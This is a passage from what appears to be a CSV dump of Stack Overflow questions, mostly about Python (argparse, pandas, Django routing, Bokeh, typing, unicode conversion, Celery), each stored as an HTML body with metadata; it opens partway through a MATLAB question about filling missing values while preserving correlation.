0.8 |   
    | 4.0
1.3 |   
2.1 | 5.2
    | 2.3
    | 1.9
2.5 | 
1.2 | 3.0
2.0 | 2.6
</code></pre>

<p><strong>My goal is to fill in missing values using the following condition:</strong></p>

<blockquote>
  <p>Denote as R the pairwise correlation between the above two columns (around 0.68). Denote as R* the correlation <strong>after</strong> the empty cells have been filled in. <strong>Fill in the table so that (R - R*)^2 = 0</strong>. This is, I want to keep the correlation structure of the data intact.</p>
</blockquote>

<p>So far I have done it using Matlab:</p>

<pre><code>clear all;

m = xlsread('data.xlsx','A2:A11') ;
r = xlsread('data.xlsx','B2:B11') ;

rho = corr(m,r,'rows','pairwise');

x0 = [1,1,1,1,1,1];
lb = [0,0,0,0,0,0];
f = @(x)my_correl(x,rho);

SOL = fmincon(f,x0,[],[],[],[],lb)
</code></pre>

<p>where the function <code>my_correl</code> is:</p>

<pre><code>function X = my_correl(x,rho)

sum_m = (11.9 + x(1) + x(2) + x(3));
sum_r = (22.3 + x(1) + x(2) + x(3));
avg_m = (11.9 + x(1) + x(2) + x(3))/8;
avg_r = (22.3 + x(4) + x(5) + x(6))/8;
rho_num = 8*(26.32 + 4*x(1) + 2.3*x(2) + 1.9*x(3) + 0.8*x(4) + 1.3*x(5) + 2.5*x(6)) - sum_m*sum_r;
rho_den = sqrt(8*(22.43 + (4*x(1))^2 + (2.3*x(2))^2 + (1.9*x(3))^2) - sum_m^2)*sqrt(8*(78.6 + (0.8*x(4))^2 + (1.3*x(5))^ + (2.5*x(6))^2) - sum_r^2);

X = (rho - rho_num/rho_den)^2;

end
</code></pre>

<p>This function computes the correlation manually, where every missing data is a variable <code>x(i)</code>.</p>

<p><strong>The problem: my actual dataset has more than 20,000 observations.</strong> There is no way I can create that rho formula manually.</p>

<p><strong>How can I fill in my dataset?</strong></p>

<p>Note 1: I am open to use alternative languages like Python, Julia, or R. Matlab it's just my default one.</p>

<p>Note 2: a 100 points bounty will be awarded to the answer. Promise from now.</p>
"
39778978,442945.0,2016-09-29 19:59:29+00:00,7,How to identify a string as being a byte literal?,"<p>In Python 3, if I have a string such that:</p>

<pre><code>print(some_str)
</code></pre>

<p>yields something like this:</p>

<pre><code>b'This is the content of my string.\r\n'
</code></pre>

<p>I know it's a byte literal. </p>

<p>Is there a function that can be used to determine if that string is in byte literal format (versus having, say, the Unicode <code>'u'</code> prefix) without first interpreting? Or is there another best practice for handling this? I have a situation wherein getting a byte literal string needs to be dealt with differently than if it's in Unicode. In theory, something like this:</p>

<pre><code>if is_byte_literal(some_str):
    // handle byte literal case
else:
    // handle unicode case
</code></pre>
"
40137114,336527.0,2016-10-19 16:40:03+00:00,7,Use cases for __init__.py in python 3.3+,"<p>Now that <code>__init__.py</code> is <a href=""https://docs.python.org/3/whatsnew/3.3.html#pep-420-implicit-namespace-packages"">no longer required</a> to make a directory recognized as a package, is it best practice to avoid them entirely if possible? Or are there still well-accepted use cases for <code>__init__.py</code> in python 3.3+?</p>

<p>From what I understand, <code>__init__.py</code> were very commonly used to run code at module import time (<a href=""http://stackoverflow.com/a/29509611/336527"">for example</a> to encapsulate internal file structure of the package or to perform some initialization steps). Are these use cases still relevant with python 3.3+?</p>
"
39732842,3814425.0,2016-09-27 19:29:22+00:00,7,Python Bokeh table columns and headers don't line up,"<p>I am trying to display a table in a jupyter notebook using python and the visualization library <a href=""http://bokeh.pydata.org/en/0.10.0/index.html"">Bokeh</a>. I use the following code to display my table in an jupyter notebook where <strong>result</strong> is a dataframe:</p>

<pre><code>source = ColumnDataSource(result)

columns = [
        TableColumn(field=""ts"", title=""Timestamp""),
        TableColumn(field=""bid_qty"", title=""Bid Quantity""),
        TableColumn(field=""bid_prc"", title=""Bid Price""),
        TableColumn(field=""ask_prc"", title=""Ask Price""),
        TableColumn(field=""ask_qty"", title=""Ask Quantity""),
    ]

data_table = DataTable(source=source, columns=columns, fit_columns=True, width=1300, height=800)
show(widgetbox([data_table], sizing_mode = 'scale_both'))
</code></pre>

<p>Previously I was using vform although this now seems to be depreciated and no longer works as expected either. This occurred after my jupyter notebook version was updated. Regardless of what I set the width my column headers don't line up and have a weird overlap with the table:</p>

<p><a href=""http://i.stack.imgur.com/aHAL0.png""><img src=""http://i.stack.imgur.com/aHAL0.png"" alt=""enter image description here""></a></p>

<p>This did not happen before, I was able to get a nice table where everything lined up. Even if I adjust the headers they still wont line up. This does not happen when I save the table as an html file instead of calling show() directly in the Jupyter notebook. What do I need to change? Is there a better way to do this?</p>

<p><strong>Full Example</strong></p>

<pre><code>from bokeh.io import show, output_notebook
from bokeh.layouts import widgetbox
from bokeh.models import ColumnDataSource
from bokeh.models.widgets import TableColumn, DataTable
import pandas as pd

output_notebook()

d = {'one' : pd.Series([1., 2., 3.], index=['a', 'b', 'c']), 
 'two' : pd.Series([1., 2., 3., 4.], index=['a', 'b', 'c', 'd'])}
df = pd.DataFrame(d)

source = ColumnDataSource(df)

columns = [
    TableColumn(field=""one"", title=""One""),
    TableColumn(field=""two"", title="" Two""),
]

data_table = DataTable(source=source, columns=columns, 
    fit_columns=True, width=800, height=800)
show(widgetbox([data_table], sizing_mode = 'scale_both'))
</code></pre>

<p>This is running on a system with the following versions:</p>

<ul>
<li>Jupyter 4.2.0 </li>
<li>Python 2.7.12 (Anaconda 2.3.0 64 bit)</li>
<li>Bokeh 0.12.2</li>
</ul>
"
39757126,1795949.0,2016-09-28 20:32:09+00:00,7,comparing strings in list to strings in list,"<p>I see that the code below can check if a word is </p>

<pre><code>list1 = 'this'
compSet = [ 'this','that','thing' ]
if any(list1 in s for s in compSet): print(list1)
</code></pre>

<p>Now I want to check if a word in a list is in some other list as below:</p>

<pre><code>list1 = ['this', 'and', 'that' ]
compSet = [ 'check','that','thing' ]
</code></pre>

<p>What's the best way to check if words in list1 are in compSet, and doing something over non-existing elements, e.g., appending 'and' to compSet or deleting 'and' from list1?</p>

<p>__________________update___________________</p>

<p>I just found that doing the same thing is not working with sys.path. The code below sometimes works to add the path to sys.path, and sometimes not.</p>

<pre><code>myPath = '/some/my path/is here'
if not any( myPath in s for s in sys.path):
    sys.path.insert(0, myPath)
</code></pre>

<p>Why is this not working? Also, if I want to do the same operation on a set of my paths,   </p>

<pre><code>myPaths = [ '/some/my path/is here', '/some/my path2/is here' ...]
</code></pre>

<p>How can I do it?</p>
"
39662847,2261442.0,2016-09-23 14:08:02+00:00,7,Tracking down implicit unicode conversions in Python 2,"<p>I have a large project where at various places problematic implicit Unicode conversions (coersions) were used in the form of e.g.:
</p>

<pre class=""lang-python prettyprint-override""><code>someDynamicStr = ""bar"" # could come from various sources

# works
u""foo"" + someDynamicStr
u""foo{}"".format(someDynamicStr)

someDynamicStr = ""\xff"" # uh-oh

# raises UnicodeDecodeError
u""foo"" + someDynamicStr
u""foo{}"".format(someDynamicStr)
</code></pre>

<p>(Possibly other forms as well.)</p>

<p><strong>Now I would like to track down those usages, especially those in actively used code.</strong></p>

<p>It would be great if I could easily replace the <code>unicode</code> constructor with a wrapper which checks whether the input is of type <code>str</code> and the <code>encoding</code>/<code>errors</code> parameters are set to the default values and then notifies me (prints traceback or such).</p>

<p><em>/edit:</em></p>

<p>While not directly related to what I am looking for I came across this gloriously horrible hack for how to make the decode exception go away altogether (the decode one only, i.e. <code>str</code> to <code>unicode</code>, but not the other way around, see <a href=""https://mail.python.org/pipermail/python-list/2012-July/627506.html"" rel=""nofollow"">https://mail.python.org/pipermail/python-list/2012-July/627506.html</a>).</p>

<p>I don't plan on using it but it might be interesting for those battling problems with invalid Unicode input and looking for a quick fix (but please think about the side effects):</p>

<pre class=""lang-python prettyprint-override""><code>import codecs
codecs.register_error(""strict"", codecs.ignore_errors)
codecs.register_error(""strict"", lambda x: (u"""", x.end)) # alternatively
</code></pre>

<p>(An internet search for <code>codecs.register_error(""strict""</code> revealed that apparently it's used in some real projects.)</p>

<p><em>/edit #2:</em></p>

<p>For explicit conversions I made a snippet with the help of <a href=""http://stackoverflow.com/a/4025310"">a SO post on monkeypatching</a>:</p>

<pre class=""lang-python prettyprint-override""><code>class PatchedUnicode(unicode):
  def __init__(self, obj=None, encoding=None, *args, **kwargs):
    if encoding in (None, ""ascii"", ""646"", ""us-ascii""):
        print(""Problematic unicode() usage detected!"")
    super(PatchedUnicode, self).__init__(obj, encoding, *args, **kwargs)

import __builtin__
__builtin__.unicode = PatchedUnicode
</code></pre>

<p>This only affects explicit conversions using the <code>unicode()</code> constructor directly so it's not something I need.</p>

<p><em>/edit #3:</em></p>

<p>The thread ""<a href=""https://stackoverflow.com/questions/6738987/extension-method-for-python-built-in-types"">Extension method for python built-in types!</a>"" makes me think that it might actually not be easily possible (in CPython at least).</p>

<p><em>/edit #4:</em></p>

<p>It's nice to see many good answers here, too bad I can only give out the bounty once.</p>

<p>In the meantime I came across a somewhat similar question, at least in the sense of what the person tried to achieve: <a href=""http://stackoverflow.com/q/2851481"">Can I turn off implicit Python unicode conversions to find my mixed-strings bugs?</a>
Please note though that throwing an exception would <strong>not</strong> have been OK in my case. Here I was looking for something which might point me to the different locations of problematic code (e.g. by printing smth.) but not something which might exit the program or change its behavior (because this way I can prioritize what to fix).</p>

<p>On another note, the people working on the Mypy project (which include Guido van Rossum) might also come up with something similar helpful in the future, see the discussions at <a href=""https://github.com/python/mypy/issues/1141"" rel=""nofollow"">https://github.com/python/mypy/issues/1141</a> and more recently <a href=""https://github.com/python/typing/issues/208"" rel=""nofollow"">https://github.com/python/typing/issues/208</a>.</p>

<p><em>/edit #5</em></p>

<p>I also came across the following but didn't have yet the time to test it: <a href=""https://pypi.python.org/pypi/unicode-nazi"" rel=""nofollow"">https://pypi.python.org/pypi/unicode-nazi</a></p>
"
39712602,6545542.0,2016-09-26 21:20:28+00:00,7,Create groups/classes based on conditions within columns,"<p>I need help transforming my data so I can read through transaction data.</p>

<p><strong>Business Case</strong></p>

<p>I'm trying to group together some related transactions to create some groups or classes of events. This data set represents workers going out on various leaves of absence events. I want to create one class of leaves based on any transaction falling within 365 days of the leave event class. For charting trends, I want to number the classes so I get a sequence/pattern.</p>

<p>My code allows me to see when the very first event occurred, and it can identify when a new class starts, but it doesn't bucket each transaction into a class.</p>

<p><strong>Requirements:</strong></p>

<ul>
<li>Tag all rows based on what leave class they fall into.</li>
<li>Number each Unique Leave Event. Using this example index 0 would be Unique Leave Event 2, index 1 would be Unique Leave Event 2, index 3 would be Unique Leave Event 2, AND index 4 would be Unique Leave Event 1, etc. </li>
</ul>

<p>I added in a column for the desired output, labeled as ""Desired Output"". Note, there can be many more rows/events per person; and there can be many more people.</p>

<p><strong>Some Data</strong></p>

<pre><code>import pandas as pd

data = {'Employee ID': [""100"", ""100"", ""100"",""100"",""200"",""200"",""200"",""300""],
        'Effective Date': [""2016-01-01"",""2015-06-05"",""2014-07-01"",""2013-01-01"",""2016-01-01"",""2015-01-01"",""2013-01-01"",""2014-01""],
        'Desired Output': [""Unique Leave Event 2"",""Unique Leave Event 2"",""Unique Leave Event 2"",""Unique Leave Event 1"",""Unique Leave Event 2"",""Unique Leave Event 2"",""Unique Leave Event 1"",""Unique Leave Event 1""]}
df = pd.DataFrame(data, columns=['Employee ID','Effective Date','Desired Output'])
</code></pre>

<p><strong>Some Code I've Tried</strong></p>

<pre><code>df['Effective Date'] = df['Effective Date'].astype('datetime64[ns]')
df['EmplidShift'] = df['Employee ID'].shift(-1)
df['Effdt-Shift'] = df['Effective Date'].shift(-1)
df['Prior Row in Same Emplid Class'] = ""No""
df['Effdt Diff'] = df['Effdt-Shift'] - df['Effective Date']
df['Effdt Diff'] = (pd.to_timedelta(df['Effdt Diff'], unit='d') + pd.to_timedelta(1,unit='s')).astype('timedelta64[D]')
df['Cumul. Count'] = df.groupby('Employee ID').cumcount()


df['Groupby'] = df.groupby('Employee ID')['Cumul. Count'].transform('max')
df['First Row Appears?'] = """"
df['First Row Appears?'][df['Cumul. Count'] == df['Groupby']] = ""First Row""
df['Prior Row in Same Emplid Class'][ df['Employee ID'] == df['EmplidShift']]  = ""Yes""

df['Prior Row in Same Emplid Class'][ df['Employee ID'] == df['EmplidShift']]  = ""Yes""

df['Effdt &gt; 1 Yr?'] = """"                                        
df['Effdt &gt; 1 Yr?'][ ((df['Prior Row in Same Emplid Class'] == ""Yes"" ) &amp; (df['Effdt Diff'] &lt; -365))  ] = ""Yes""

df['Unique Leave Event'] = """"
df['Unique Leave Event'][ (df['Effdt &gt; 1 Yr?'] == ""Yes"") | (df['First Row Appears?'] == ""First Row"") ] = ""Unique Leave Event"" 

df
</code></pre>
"
39883043,6928526.0,2016-10-05 20:24:00+00:00,7,typing module - String Literal Type,"<p>I'm using the new Python 3.5 module <a href=""https://docs.python.org/3/library/typing.html#module-typing"" rel=""nofollow"">typing</a> and it has been joyous.</p>

<p>I was wondering how one might specify a type based on an exact string literal. For example, a function is guaranteed to return one of the four strings - ""North"", ""West"", ""East"", ""South - how can we express that as a specific type variable, instead of just <code>str</code>.</p>

<p>I looked through the documentation, finding the <code>Union</code> type and the <code>TypeVar</code> function, but was unable to find an answer.</p>

<p>An example function expressing this problem:</p>

<pre><code>def compute_quadrant(x: int, y: int) -&gt; str:
    if x &gt; 0 and y &gt; 0:
        return 'I'
    elif x &lt; 0 and y &gt; 0:
        return 'II'
    elif x &lt; 0 and y &lt; 0:
        return 'III'
    elif x &gt; 0 and y &lt; 0:
        return 'IV'
</code></pre>

<p>Instead of just returning <code>str</code>, I'd like to to return a more specific type that is one of four values - <code>""I""</code>, <code>""II""</code>, <code>""III""</code>, or <code>""IV""</code>.</p>

<p>In Typescript, one can do: <code>type Quadrant = ""I"" | ""II"" | ""III"" | ""IV""</code> - is there any nice Python sugar for this use case with the <code>typing</code> module?</p>
"
39996295,2747160.0,2016-10-12 10:26:59+00:00,7,Correct way to get allowed arguments from ArgumentParser,"<p><strong>Question:</strong> What is the intended / official way of accessing possible arguments from an existing <code>argparse.ArgumentParser</code> object?</p>

<p><strong>Example:</strong> Let's assume the following context:</p>

<pre><code>import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--foo', '-f', type=str)
</code></pre>

<p>Here I'd like to get the following list of allowed arguments:</p>

<pre><code>['-h', '--foo', '--help', '-f']
</code></pre>

<p>I found the following workaround which does the trick for me</p>

<pre><code>parser._option_string_actions.keys()
</code></pre>

<p>But I'm not happy with it, as it involves accessing a <code>_</code>-member that is not officially documented. Whats the correct alternative for this task?</p>
"
39598666,773609.0,2016-09-20 15:53:07+00:00,7,Django Db routing,"<p>I am trying to run my Django application with two db's (1 master, 1 read replica). My problem is if I try to read right after a write the code explodes. For example:</p>

<ul>
<li>p = Product.objects.create()</li>
<li><ol>
<li>Product.objects.get(id=p.id)</li>
</ol></li>
</ul>

<p>OR</p>

<ul>
<li><ol start=""2"">
<li>If user is redirected to Product's
details page</li>
</ol></li>
</ul>

<p>The code runs way faster than the read replica. And if the read operation uses the replica the code crashes, because it didn't update in time. </p>

<p>Is there any way to avoid this? For example, the db to read being chosen by request instead of by operation?</p>

<p>My Router is identical to Django's documentation:</p>

<pre><code>import random

class PrimaryReplicaRouter(object):
    def db_for_read(self, model, **hints):
        """"""
        Reads go to a randomly-chosen replica.
        """"""
        return random.choice(['replica1', 'replica2'])

    def db_for_write(self, model, **hints):
        """"""
        Writes always go to primary.
        """"""
        return 'primary'

    def allow_relation(self, obj1, obj2, **hints):
        """"""
        Relations between objects are allowed if both objects are
        in the primary/replica pool.
        """"""
        db_list = ('primary', 'replica1', 'replica2')
        if obj1._state.db in db_list and obj2._state.db in db_list:
            return True
        return None

    def allow_migrate(self, db, app_label, model_name=None, **hints):
        """"""
        All non-auth models end up in this pool.
        """"""
        return True
</code></pre>
"
39871227,2932052.0,2016-10-05 10:13:12+00:00,7,Is it possible to def a function with a dotted name in Python?,"<p>In the question <a href=""https://stackoverflow.com/questions/231767/what-does-the-yield-keyword-do""><em>What does the ""yield"" keyword do?</em></a>, I found a Python syntax being used that I didn't expect to be valid. The question is old and has a huge number of votes, so I'm surprised nobody at least left a comment about this function definition:</p>

<pre><code>def node._get_child_candidates(self, distance, min_dist, max_dist):
    if self._leftchild and distance - max_dist &lt; self._median:
       yield self._leftchild
    if self._rightchild and distance + max_dist &gt;= self._median:
       yield self._rightchild  
</code></pre>

<p>What I tried to get this sort of syntax evaluated:</p>

<ul>
<li>assigning an attribute to a class or object</li>
<li>redefining a function of an imported module</li>
</ul>

<p>fails so far with </p>

<blockquote>
  <p>SyntaxError: invalid syntax</p>
</blockquote>

<p>I looked up the <a href=""http://well-adjusted.de/~jrschulz/mspace/"">link (maybe outdated)</a> given in the question, and searched the web for the usage of <code>def</code>, but I found nothing explaining this ""dotted name"" pattern. I'm using Python 3, maybe this is a feature of Python 2?</p>

<p><strong>Is (or was) this syntax valid, if yes what does it mean?</strong></p>
"
39986786,4596596.0,2016-10-11 21:10:02+00:00,6,How to limit the size of pandas queries on HDF5 so it doesn't go over RAM limit?,"<p>Let's say I have a pandas Dataframe</p>

<pre><code>import pandas as pd

df = pd.DataFrame()

df

   Column1    Column2
0  0.189086 -0.093137
1  0.621479  1.551653
2  1.631438 -1.635403
3  0.473935  1.941249
4  1.904851 -0.195161
5  0.236945 -0.288274
6 -0.473348  0.403882
7  0.953940  1.718043
8 -0.289416  0.790983
9 -0.884789 -1.584088
........
</code></pre>

<p>An example of a query is <code>df.query('Column1 &gt; Column2')</code></p>

<p>Let's say you wanted to limit the save of this query, so the object wasn't so large. Is there ""pandas"" way to accomplish this? </p>

<p>My question is primarily for querying at HDF5 object with pandas. An HDF5 object could be far larger than RAM, and therefore queries could be larger than RAM. </p>

<pre><code># file1.h5 contains only one field_table/key/HDF5 group called 'df'
store = pd.HDFStore('file1.h5')

# the following query could be too large 
df = store.select('df',columns=['column1', 'column2'], where=['column1==5'])
</code></pre>

<p>Is there a pandas/Pythonic way to stop users for executing queries that surpass a certain size? </p>
"
39971030,674039.0,2016-10-11 05:33:03+00:00,6,Make an object that behaves like a slice,"<p>How can we make a class represent itself as a slice when appropriate?</p>

<p>This didn't work:</p>

<pre><code>class MyThing(object):
    def __init__(self, start, stop, otherstuff):
        self.start = start
        self.stop = stop
        self.otherstuff = otherstuff
    def __index__(self):
        return slice(self.start, self.stop)
</code></pre>

<p>Expected output:</p>

<pre><code>&gt;&gt;&gt; thing = MyThing(1, 3, 'potato')
&gt;&gt;&gt; 'hello world'[thing]
'el'
</code></pre>

<p>Actual output:</p>

<pre><code>TypeError: __index__ returned non-(int,long) (type slice)
</code></pre>

<p>Inheriting from <code>slice</code> doesn't work either.  </p>
"
39644514,3865897.0,2016-09-22 16:39:48+00:00,6,How to find ASN.1 components of EC key python-cryptography,"<p>I am generating a EC key using python cryptography module in this way</p>

<pre><code>from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
key=ec.generate_private_key(ec.SECP256R1(), default_backend())
</code></pre>

<p>The asn.1 structure of EC key is as follows</p>

<pre><code>   ECPrivateKey ::= SEQUENCE {
 version        INTEGER { ecPrivkeyVer1(1) } (ecPrivkeyVer1),
 privateKey     OCTET STRING,
 parameters [0] ECParameters {{ NamedCurve }} OPTIONAL,
 publicKey  [1] BIT STRING OPTIONAL
 }
</code></pre>

<p>from <a href=""https://tools.ietf.org/html/rfc5915"">https://tools.ietf.org/html/rfc5915</a> setion 3.</p>

<p>my question is how to get the ASN.1 components from this key. I want to convert the key object to OpenSSH private key, something like</p>

<pre><code>-----BEGIN EC PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9549ED842979FDAF5299BD7B0E25B384

Z+B7I6jfgC9C03Kcq9rbWKo88mA5+YqxSFpnfRG4wkm2eseWBny62ax9Y1izGPvb
J7gn2eBjEph9xobNewgPfW6/3ZDw9VGeaBAYRkSolNRadyN2Su6OaT9a2gKiVQi+
mqFeJmxsLyvew9XPkZqQIjML1d1M3T3oSA32zYX21UY=
-----END EC PRIVATE KEY-----
</code></pre>

<p>It is easy with handling DSA or RSA because all the ASN.1 parameters are integers in that.</p>

<p>Thank You in advance</p>
"
39778435,308827.0,2016-09-29 19:25:04+00:00,6,Cache file handle to netCDF files in python,"<p>Is there a way to cache python file handles? I have a function which takes a netCDF file path as input, opens it, extracts some data from the netCDF file and closes it. It gets called a lot of times, and the overhead of opening the file each time is high.</p>

<p>How can I make it faster by maybe caching the file handle? Perhaps there is a python library to do this</p>
"
39752005,206403.0,2016-09-28 15:38:30+00:00,6,Variable length arguments,"<p>I am creating a python program using the <a href=""https://docs.python.org/3/library/argparse.html""><code>argparse</code> module</a> and I want to allow the program to take either one argument or 2 arguments.</p>

<p>What do I mean?  Well, I am creating a program to download/decode MMS messages and I want the user to either be able to provide a phone number and MMS-Transaction-ID to download the data or provide a file from their system of already downloaded MMS data.</p>

<p>What I want is something like this, where you can either enter in 2 arguments, or 1 argument:</p>

<pre><code>./mms.py (phone mmsid | file)
</code></pre>

<p><sub>NOTE: <code>phone</code> would be a phone number (like <code>15555555555</code>), <code>mmsid</code> a string (MMS-Transaction-ID) and <code>file</code> a file on the user's computer</sub></p>

<p>Is this possible with <code>argparse</code>?  I was hoping I could use <code>add_mutually_exclusive_group</code>, but that didn't seem to do what I want.</p>

<pre><code>parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('phone', help='Phone number')
group.add_argument('mmsid', help='MMS-Transaction-ID to download')
group.add_argument('file', help='MMS binary file to read')
</code></pre>

<p>This gives the error (removing <code>required=True</code> gives the same error):</p>

<blockquote>
  <p>ValueError: mutually exclusive arguments must be optional</p>
</blockquote>

<p>It looks like it wants me to use <code>--phone</code> instead of <code>phone</code>:</p>

<pre><code>parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--phone', help='Phone number')
group.add_argument('--mmsid', help='MMS-Transaction-ID to download')
group.add_argument('--file', help='MMS binary file to read')
</code></pre>

<p>When running my program with no arguments, I see:</p>

<blockquote>
  <p>error: one of the arguments --phone --mmsid --file is required</p>
</blockquote>

<p>This is closer to what I want, but can I make <code>argparse</code> do <code>(--phone --msid) or (--file)</code>?</p>
"
39684942,4872015.0,2016-09-25 08:42:29+00:00,6,How to make word boundary \b not match on dashes,"<p>I simplified my code to the specific problem I am having.</p>

<pre><code>import re
pattern = re.compile(r'\bword\b')
result = pattern.sub(lambda x: ""match"", ""-word- word"")
</code></pre>

<p>I am getting</p>

<pre><code>'-match- match'
</code></pre>

<p>but I want </p>

<pre><code>'-word- match'
</code></pre>

<p>edit:  </p>

<p>Or for the string <code>""word -word-""</code></p>

<p>I want</p>

<pre><code>""match -word-""
</code></pre>
"
39904161,1243255.0,2016-10-06 19:27:24+00:00,6,Organizing list of tuples,"<p>I have a list of tuples which I create dynamically.</p>

<p>The list appears as:</p>

<pre><code>List = [(1,4), (8,10), (19,25), (10,13), (14,16), (25,30)]
</code></pre>

<p>Each tuple <code>(a, b)</code> of list represents the range of indexes from a certain table.</p>

<p>The ranges <code>(a, b) and (b, d)</code> is same in my situation as <code>(a, d)</code></p>

<p>I want to merge the tuples where the 2nd element matches the first of any other.</p>

<p>So, in the example above, I want to merge <code>(8, 10), (10,13)</code> to obtain <code>(8,13)</code> and remove <code>(8, 10), (10,13)</code></p>

<p><code>(19,25) and (25,30)</code> merge should yield <code>(19, 30)</code></p>

<p>I don't have a clue where to start. The tuples are non overlapping.</p>

<p>Edit: I have been trying to just avoid any kind of for loop as I have a pretty large list</p>
"
40056275,5714445.0,2016-10-15 07:22:13+00:00,6,How does numpy broadcasting perform faster?,"<p>In the following question,
<a href=""http://stackoverflow.com/a/40056135/5714445"">http://stackoverflow.com/a/40056135/5714445</a></p>

<p>Numpy's broadcasting provides a solution that's almost 6x faster than using np.setdiff1d() paired with np.view(). How does it manage to do this?</p>

<p>And using <code>A[~((A[:,None,:] == B).all(-1)).any(1)]</code> speeds it up even more. 
Interesting, but raises yet another question. How does this perform even better?</p>
"
39621900,4379569.0,2016-09-21 16:28:32+00:00,6,Using a DLL exported from D,"<p>I've created a simple encryption program in D, and I had the idea to make a DLL from it and try to import it to, for example, Python.</p>

<p>I've could simply call my <code>main</code> function, becouse it dosn't need any params. But when I get to my encrytion method, <strong>it uses dynamic-lenght <code>ubyte[]</code> arrays</strong>, but as far as I know, they <strong>don't exist in other C/C++ based langs</strong>.</p>

<p>For example, there's the first line of one of my funcs:<br>
<code>ubyte[] encode(ubyte[] data, ubyte[] key){</code></p>

<p>But I can't use an array without fixed lenght in other languages!
How can I import that function, for example, in Python?</p>

<p><strong>EDIT:</strong></p>

<p>I know that I can create a wrapper that takes a pointer and the lenght of the array, but isn't there a more elegant solution?<br>
(Where I don't need to use D to use a lib written in D)</p>
"
39830235,,2016-10-03 11:12:07+00:00,6,Celery workers wait,"<p>I am writing an application with using Celery framework. Some of my tasks are pretty heavyweight and can execute for a long time.</p>

<p>I've noticed that when I run 5-6 workers and then put 10-20 tasks they may be distributed by workers randomly and sometimes if one get free of tasks, it does not start remaining ones and they will be handled by others only when they complete their tasks (maybe in hours). If I run one more worker at this time - it does nothing, but can accept new tasks.</p>

<p>Is it a bug or a feature and how do I solve my needs? It does not make sense to wait hours while we have free workers and not started tasks.</p>
"
39628456,3950550.0,2016-09-22 00:30:01+00:00,6,Zen of Python: Errors should never pass silently. Why does zip work the way it does?,"<p>I use python's function zip a lot in my code (mostly to create dicts like below) </p>

<pre><code>dict(zip(list_a, list_b)) 
</code></pre>

<p>I find it really useful, but sometimes it frustrates me because I end up with a situation where list_a is a different length to list_b. zip just goes ahead and zips together the two lists until it achieves a zipped list that is the same length as the shorter list, ignoring the rest of the longer list. This seems like it should be treated as an error in most circumstances, which according to the zen of python should never pass silently. </p>

<p>Given that this is such an integral function, I'm curious as to why it's been designed this way? Why isn't it treated as an error if you try to zip together two lists of different lengths?</p>
"
40010175,5231398.0,2016-10-12 23:56:33+00:00,6,Summation of elements of dictionary that are list of lists,"<pre><code>d = {
  'a': [[1, 2, 3], [1, 2, 3]],
  'b': [[2, 4, 1], [1, 6, 1]],
}

def add_element(lst):
    ad = [sum(i) for i in zip(*lst)]
    return ad

def csv_reducer2(dicty):
    return {k: list(map(add_element, v)) for k, v in dicty.items()}

csv_reducer2(d)
</code></pre>

<p>required output:</p>

<pre><code>{'b': [3, 10, 2], 'a': [2, 4, 6]}
</code></pre>

<p>Above is the code I have been trying but it gives an error</p>

<blockquote>
  <p>zip argument #1 must support iteration</p>
</blockquote>
"
39709606,3626104.0,2016-09-26 18:13:20+00:00,6,Identify groups of varying continuous numbers in a list,"<p>In this <a href=""https://stackoverflow.com/questions/2154249/identify-groups-of-continuous-numbers-in-a-list"">other SO post</a>, a Python user asked how to group continuous numbers such that any sequences could just be represented by its start/end and any stragglers would be displayed as single items. The accepted answer works brilliantly for continuous sequences.</p>

<p>I need to be able to adapt a similar solution but for a sequence of numbers that have potentially (not always) varying increments. Ideally, how I represent that will also include the increment (so they'll know if it was every 3, 4, 5, nth)</p>

<p>Referencing the original question, the user asked for the following input/output</p>

<pre><code>[2, 3, 4, 5, 12, 13, 14, 15, 16, 17, 20]  # input
[(2,5), (12,17), 20]
</code></pre>

<p>What I would like is the following (Note: I wrote a tuple as the output for clarity but xrange would be preferred using its step variable):</p>

<pre><code>[2, 3, 4, 5, 12, 13, 14, 15, 16, 17, 20]  # input
[(2,5,1), (12,17,1), 20]  # note, the last element in the tuple would be the step value
</code></pre>

<p>And it could also handle the following input</p>

<pre><code>[2, 4, 6, 8, 12, 13, 14, 15, 16, 17, 20]  # input
[(2,8,2), (12,17,1), 20]  # note, the last element in the tuple would be the increment
</code></pre>

<p>I know that <code>xrange()</code> supports a step so it may be possible to even use a variant of the other user's answer. I tried making some edits based on what they wrote in the explanation but I wasn't able to get the result I was looking for.</p>

<p>For anyone that doesn't want to click the original link, the code that was originally posted by <a href=""https://stackoverflow.com/users/97828/nadia-alramli"">Nadia Alramli</a> is:</p>

<pre><code>ranges = []
for key, group in groupby(enumerate(data), lambda (index, item): index - item):
    group = map(itemgetter(1), group)
    if len(group) &gt; 1:
        ranges.append(xrange(group[0], group[-1]))
    else:
        ranges.append(group[0])
</code></pre>
"
39898927,6845228.0,2016-10-06 14:39:13+00:00,6,Global name 'camera' is not defined in python,"<p>In this script :-</p>

<pre><code>camera_port = 0
ramp_frames = 400
camera = cv2.VideoCapture(camera_port) 
def get_image():
  global camera
  retval, im = camera.read()
  return im

def Camera():
    global camera
    for i in xrange(ramp_frames):
     temp = get_image()
    print(""Taking image..."")
    camera_capture = get_image()
    file = ""opencv.png""
    cv2.imwrite(file, camera_capture)
    del(camera)

def Sendmail():
    loop_value = 1
    while loop_value==1:
        try:
            urllib2.urlopen(""https://google.com"")
        except urllib2.URLError, e:
            print ""Network currently down."" 
            sleep(20)
        else:
            print ""Up and running."" 
            loop_value = 0
def Email():
    loop_value = 2
    while loop_value==2:
        try:
            Camera()
            Sendmail()
            yag = yagmail.SMTP('email',   'pass')
            yag.send('amitaagarwal565@gmail.com', subject = ""This is    opencv.png"", contents = 'opencv.png')
            print ""done""
        except smtplib.SMTPAuthenticationError:
            print 'Retrying in 30 seconds'
            sleep(30)
        else:
            print 'Sent!'
            sleep(20)
            loop_value = 2
</code></pre>

<p>I get this error :-</p>

<p>What am I doing wrong. I have even defined camera globally, that to TWICE. Can somone please point out my mistake in the code? I use python 2.7 with Opencv module</p>

<pre><code>File ""C:\Python27\Scripts\Servers.py"", line 22, in Camera
    temp = get_image()
  File ""C:\Python27\Scripts\Servers.py"", line 16, in get_image
    retval, im = camera.read()
NameError: global name 'camera' is not defined
</code></pre>

<p><em>UPDATE</em>
Look above for updated code</p>
"
